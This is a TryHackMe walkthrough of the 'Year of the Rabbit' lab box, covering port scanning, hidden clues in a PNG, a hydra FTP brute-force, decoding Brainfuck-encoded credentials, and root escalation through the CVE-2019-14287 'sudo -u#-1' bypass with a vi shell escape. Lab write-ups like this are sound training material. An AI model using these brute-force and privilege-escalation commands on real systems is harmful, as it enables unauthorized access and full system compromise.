---
published: true
title: Year of the Rabbit - TryHackMe Walkthrough
category: Writeup
author: F3dai
image: 'https://imgur.com/H0IDE3I.png'
---
"Can you hack into the Year of the Rabbit box without falling down a hole? Please ensure your volume is turned up!" This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [Year of the Rabbit](https://www.tryhackme.com/room/yearoftherabbit)

**Difficulty:** Medium

**Author:** MuirlandOracle

## Enumeration

We are given the IP 10.10.62.162. Run an nmap scan with the following command:

<pre>nmap -p- -A -o portscan 10.10.62.162</pre>

Here are the open ports:

<pre>PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works</pre>

Let's check out HTTP on my browser:

![port 80](https://imgur.com/dAnM3vV.png)

This is a default apache2 web page. Let's use dirb to find any other paths in the web directory:

<pre>dirb http://10.10.62.162/</pre>

![dirb](https://imgur.com/aOTbmyk.png)

**assets**:

![assets](https://imgur.com/eJJDEcb.png)

There is an irrelevant video and a css file. 

A quick look at the css file and I found this:

![css](https://imgur.com/G0yJu4y.png)

<pre>  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */</pre>
  
Visiting that path prompts us with a message to disable JavaScript, then redirects us to a youtube page:

[Rick Astley - Never Gonna Give You Up](https://www.youtube.com/watch?v=dQw4w9WgXcQ)

Go to about:config to turn off your JS:

![JS](https://imgur.com/NzIG0yD.png)

Revisiting sup3r_s3cret_fl4g gives us this result:

![No JS](https://imgur.com/ya6rdYQ.png)

<pre>Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!</pre>

If you listen to the video, there is a voice that says "I will put you out of your misery, you are looking in the wrong place" (Around 50 seconds in).

I analysed the request and saw something of interest:

![request](https://imgur.com/Lgx3NsZ.png)

There is a hidden directory:

![hidden dir](https://imgur.com/BtWuUvH.png)

<pre>/intermediary.php?hidden_directory=/WExYY2Cv-qU</pre>

Let's investigate this:

![image in dir](https://imgur.com/11XEeXl.png)

/WExYY2Cv-qU/Hot_Babe.png is an image of a woman. I downloaded this image to my local machine and did some basic forensic investigation. I used a tool called **exiftool** to analyse the meta data:

<pre>exiftool Hot_Babe.png</pre>

![exif](https://imgur.com/k3VAdQe.png)

The warning message: [minor] Trailer data after PNG IEND chunk

This is talking about the trailer of the file data. Let's use a tool called xxd to analyse the hex data of the file. I always redirect the output to a file called "hex" just to make it easier to analyse.

<pre>xxd Hot_Babe.png > hex</pre>

Since it mentioned something about the trailer, I had a look at the end of the file and found some text:

![hidden xxd](https://imgur.com/p33WFYk.png)

You can also see the strings with the following command:

<pre>strings Hot_Babe.png</pre>

There is a hidden message that says:

<pre>Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:</pre>

And then follows many lines of strings. I'm assuming one of the trailering strings after these lines is the password for the ftp server. Let's redirect the strings to a file:

<pre>strings Hot_Babe.png > allstrings</pre>

Assuming one of the lines of text is the password, we could brute force the login with these as a wordlist. Let's only include the lines after "One of these is the password:" in a wordlist:

<pre>sed -n '/^One of these is the password:$/ { :a; n; p; ba; }' allstrings > wordlist</pre>

We now have a file called "wordlist" with all of the strings after "One of these is the password:". We can now construct a hydra command to brute-force the user "ftpuser" against our wordlist to try and gain authorised access.

<pre>hydra -V -l ftpuser -P wordlist ftp://10.10.62.162</pre>

![hydra verbose](https://imgur.com/vaLAVmm.png)

Using these credentials, let's explore the ftp server:

<pre>ftp 10.10.62.162
ftpuser
5***********Q</pre>

There is a .txt file called "Eli's_Creds.txt". Transfer this over to your local machine.

<pre>get Eli's_Creds.txt
bye</pre>

![ftp](https://imgur.com/hA7M9ll.png)

<pre>cat Eli\'s_Creds.txt</pre>

![Elis creds](https://imgur.com/3bqt1Uk.png)

It seems like some sort of encrypted data. 

<pre>+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ +.&lt;++ +[-&gt;-
--&lt;]&gt; ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- --.&lt;+
++++[ -&gt;--- --&lt;]&gt; -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ .++++ +++.- --.&lt;+
+++++ +++[- &gt;---- ----- &lt;]&gt;-- ----- ----. ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
]&gt;+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.. ++++. ----- ---.+
++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.&lt;+ ++++[ -&gt;---
--&lt;]&gt; -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ +.&lt;++ +++[- &gt;++++
+&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;+.&lt;+
++++[ -&gt;--- --&lt;]&gt; ---.&lt; +++++ [-&gt;-- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++
&lt;]&gt;++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- -.+++ +.&lt;++ +++++ [-&gt;++ +++++
&lt;]&gt;+. &lt;+++[ -&gt;--- &lt;]&gt;-- ---.- ----. &lt;</pre>

Based on experience, this looks like an Esoteric language.

[Esoteric languages](https://en.wikipedia.org/wiki/Esoteric_programming_language)

This website will help decrypt the above data:

[Try It Online - tio.run](https://tio.run/)

Go to the brainfuck decryptor and enter in the data:

![decrypt brainfuck](https://imgur.com/DN7euDd.png)

<pre>User: eli
Password: D***********d</pre>

## User Eli

Let's try and SSH using the credentials:

<pre>ssh eli@10.10.62.162</pre>

![ssh](https://imgur.com/dnoqFiH.png)

We are logged in as "eli". We have also been presented with a message:

<pre>"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"</pre>

They mentiond the work "s3cr3t" which could be a directory name based on how they spelt it. I ran the following command to find this directory on the system:

<pre>find / -name s3cr3t -type d 2>/dev/null</pre>

![find secret](https://imgur.com/6HXvZr0.png)

There is a file called ".th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!" in /usr/games/s3cr3t:

![message](https://imgur.com/GJGOmBQ.png)

We have some possible credentials:

<pre>Gwendoline:M***********I</pre>

We have another user called "gwendoline" in the home directory.

![/home](https://imgur.com/KN6AnGK.png)

Let's try and change to this user with the provided credentials:

<pre>su gwendoline</pre>

![su](https://imgur.com/HBLVKpx.png)

## User gwendoline

There is a user.txt: /home/gwendoline/user.txt.

Now we need to escalate our privileges. Try the following command to see what the current user can execute as root:

<pre>sudo -l</pre>

![sudo -l](https://imgur.com/k1mM9Rn.png)

<pre>User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt</pre>

This basically means that gwendoline user can run vi command to read user.txt as every other user except root.

Notice how it is (ALL, !root) instead of (ALL, ALL). This is problematic because we can’t use sudo as root. 

This was a difficult part for me because I had no idea how to run vi as root. I couldn't exploit vi, so I researched ways to exploit sudo. You can find the version of sudo with the following command:

<pre>sudo -V</pre>

![sudo v](https://imgur.com/5VhxkRT.png)

<pre>Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3</pre>

I eventually found this CVE about exploiting sudo:

[Sudo Exploit - ExploitDB](https://www.exploit-db.com/exploits/47502)

This is a good website explaining the exploit:

[cve-2019-14287 - whitesourcesoftware](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287)

This is essentially the exploit:

<pre>sudo -u#-1</pre>

So we can construct the following command to use vi and escelate the privileges:

<pre>sudo -u#-1  /usr/bin/vi /home/gwendoline/user.txt
:set shell=/bin/sh
:shell</pre>

![sudo rooooottttt](https://imgur.com/0gNulGc.png)

The last flag is in /root/root.txt.
